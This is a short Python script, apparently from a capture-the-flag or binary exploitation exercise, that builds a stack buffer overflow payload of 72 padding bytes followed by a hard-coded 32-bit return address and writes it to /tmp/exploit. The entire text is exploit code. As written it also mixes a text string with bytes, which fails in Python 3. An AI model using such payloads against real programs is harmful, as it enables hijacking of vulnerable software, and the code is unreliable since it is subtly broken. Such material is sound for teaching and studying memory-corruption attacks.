payload = 'A' * 72

payload += b"\x54\x84\x04\x08"

with open('/tmp/exploit', 'wb') as f:
    f.write(payload)
